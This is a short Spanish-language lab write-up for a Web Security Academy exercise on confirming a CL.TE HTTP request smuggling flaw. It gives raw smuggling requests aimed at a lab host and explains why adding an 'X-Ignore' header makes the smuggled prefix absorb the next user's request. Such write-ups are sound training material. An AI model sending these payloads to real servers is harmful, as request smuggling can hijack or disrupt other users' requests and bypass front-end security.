---
title: "04 - HTTP request smuggling, confirming a CL.TE vulnerability via differential responses"
---

# 04 - HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

```HTTP
POST / HTTP/1.1\r\n
Host: 0a97002803ea466780098fc60048004f.web-security-academy.net\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 29\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /notFound HTTP/1.1\r\n
```

Así solo no va a funcionar , ¿Por qué?
Porque la petición buena que hagamos quedará tal que así:

```HTTP
GET /notFound HTTP/1.1\r\n
GET / HTTP/1.1\r\n
Host: ...
```

Y claro , tirará 400, la cosa es hacerlo así :

```HTTP
POST / HTTP/1.1\r\n
Host: 0a97002803ea466780098fc60048004f.web-security-academy.net\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 29\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /notFound HTTP/1.1\r\n
X-Ignore: X
```

Porque entonces quedará así:

```HTTP
GET /notFound HTTP/1.1\r\n
X-Ignore: XGET / HTTP/1.1\r\n
Host: ...
```
